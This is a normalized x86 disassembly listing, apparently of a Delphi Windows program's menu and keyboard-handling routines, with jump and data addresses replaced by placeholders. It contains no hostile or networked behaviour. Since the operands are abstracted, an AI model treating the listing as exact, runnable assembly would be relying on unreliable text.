jmp r-xdata
sub esi 0x4
mov esi [ esi ]
sub_43718c
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x25 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_437614
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x26 ] 0x0
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4055c8
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_4375dd
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x2c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_4365a0
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_4055c8
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x34 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43761b
lea eax [ ebp - 0x44 ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax ebx
call sub_4377cc
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x34 ] eax
inc esi
dec [ ebp - 0x34 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_4365b0
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_405974
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x26 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_436f88
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4365b0
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4365b0
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_404650
mov eax [ ebp - 0x2c ]
call sub_404650
mov eax [ ebp - 0x14 ]
call sub_404650
mov eax [ ebp - 0xc ]
call sub_404650
retn
inc eax
mov [ ebp - 0x34 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_436f88
pop ecx
mov eax [ ebp - 0x20 ]
call sub_40580c
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4365b0
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x38 ]
call sub_439384
mov eax [ ebp - 0x38 ]
lea edx [ ebp - 0x1c ]
call sub_4097dc
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x20 ]
call sub_405584
inc esi
dec [ ebp - 0x34 ]
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_40e8cc
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x20 ]
movzx eax [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
movzx eax al
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x1c ]
call sub_40e8cc
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4365b0
push eax
mov edx esi
mov eax ebx
call sub_4365b0
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x2c ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x34 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x40 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x20 ]
call sub_405a44
mov eax [ ebp - 0x40 ]
lea edx [ ebp - 0x1c ]
call sub_4097dc
push ebp
mov eax [ ebp - 0x1c ]
call sub_436f58
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x1c ]
call sub_436f58
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_40e8cc
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
call sub_4055c8
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov ebx eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx ebx
mov eax [ ebp - 0x2c ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4365b0
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_4365b0
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_439294
mov edx [ ebp - 0x3c ]
pop eax
call sub_405584
mov edx esi
mov eax ebx
call sub_4365b0
push eax
mov edx esi
mov eax ebx
call sub_4365b0
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x2c ]
mov edi [ eax ]
call [ edi + 0x64 ]
mov ebx [ ebp - 0x18 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x20 ]
mov ecx ebx
mov eax r-xdata
call sub_405acc
lea eax [ ebp - 0x20 ]
mov ecx ebx
mov edx [ ebp - 0x1c ]
call sub_43700c
jmp r-xdata
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x18 ]
call sub_405a44
mov edx [ ebp - 0x44 ]
lea eax [ ebp - 0x20 ]
xor ecx ecx
call sub_43700c
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov ecx 0x1
xchg edx eax
call sub_405a84
sub eax 0x4
mov eax [ eax ]
sub_437674
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_4365a0
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_4365a0
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
movzx eax [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4377fc
test al al
je r-xdata
mov eax esi
call sub_4365a0
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4365b0
call sub_437650
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_4365b0
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_4365b0
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4365b0
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4365b0
call sub_437650
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_4365b0
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4365b0
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4365b0
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_4365b0
call sub_437650
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_4377cc
push ebx
mov ebx eax
movzx eax [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
movzx eax [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_4377cc
and eax 0x7f
movzx eax [ eax + rw-data ]
sub_4377fc
push ebx
mov ebx eax
movzx eax [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
movzx eax [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_4377fc
and eax 0x7f
movzx eax [ eax + rw-data ]
sub_43782c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_434420
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_41ffc4
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_4387dc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_4378d8
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_404650
mov eax [ esi + 0x44 ]
call sub_404650
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420010
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_43794c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_43794c
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_433f88
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_4369a8
mov eax ebx
pop esi
pop ebx
retn
sub_43798c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_4365a0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_4365b0
call sub_43798c
pop ecx
test al al
je r-xdata
sub_437a24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_43798c
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_433f88
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_437a54
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_437a24
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_438ff8
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_437ac4
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_437a24
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_437ae0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_437a24
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_43718c
mov ebx eax
xor edx edx
mov eax edi
call sub_437674
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_436acc
mov eax [ esi + 0x34 ]
call sub_436acc
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_434924
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
cmp edi [ ebx + 0x2a0 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x29c ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_4585f8
push eax
call DrawMenuBar
sub_437bbc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_437cef
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x16 ] 0x0
lea eax [ ebp - 0x16 ]
push eax
call GetKeyboardLayoutNameA
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_437cc5
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx 0x80000002
mov eax [ ebp - 0xc ]
call sub_4217a0
lea eax [ ebp - 0x20 ]
lea edx [ ebp - 0x16 ]
mov ecx 0xa
call sub_4057a0
mov ecx [ ebp - 0x20 ]
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_405864
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_421a08
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax [ ebp - 0xc ]
call sub_422068
mov edx 0x8000
mov eax [ ebp - 0x4 ]
call sub_40fa10
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_437ca8
push [ fs : edx ]
mov [ fs : edx ] esp
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call GetProcAddress
mov ebx eax
call ebx
movzx eax [ eax + 0x28 ]
and ax 0x1
cmp ax 0x1
sete [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437caf
mov eax [ ebp - 0x8 ]
push eax
call FreeLibrary
retn
sub_437d60
push ebx
xor ebx ebx
push 0xa5
call GetKeyState
test ax ax
jge r-xdata
mov eax ebx
pop ebx
retn
push 0x0
call GetKeyboardLayout
mov ebx eax
cmp ebx [ rw-data ]
je r-xdata
movzx ebx [ rw-data ]
call sub_437bbc
mov [ rw-data ] ebx
sub_437d9c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movzx ebx [ esp + 0x4 ]
test bx bx
je r-xdata
mov eax ebx
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add bx 0x2000
test [ esp + 0xb ] 0x20
je r-xdata
add bx 0x4000
add bx 0x8000
sub_437dfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_437dfc
pop ecx
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_437f22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_437a24
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_436acc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_437dec
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_437f50
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov [ ebp - 0xc ] eax
xor ebx ebx
call sub_437d60
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_437d9c
mov [ ebp - 0x6 ] ax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_42cdb0
xor eax eax
push ebp
push sub_438023
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42cdb0
xor eax eax
push ebp
push sub_437ff8
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_437dfc
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42cda8
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43802a
mov eax [ rw-data ]
call sub_42cda8
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_437a24
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_43802a
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov bl 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43804c
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_4383e0
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_4383e0
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_438108
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_438710
mov eax ebx
call sub_40a898
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
mov edi eax
test di 0x2
je r-xdata
test di 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test di 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_4381b4
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_438108
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_4057a0
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_4059dc
lea edx [ ebp - 0x200 ]
call sub_40a970
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_438248
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_4382bc
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4387b8
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4387b8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
movzx edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_4387b8
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_4382c8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_4381b4
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_438248
mov eax ebx
call sub_4387dc
jmp r-xdata
sub_438330
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
movzx ecx [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_438378
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_44910c
mov eax ebx
call sub_437974
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_449150
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_420098
sub_4383b4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
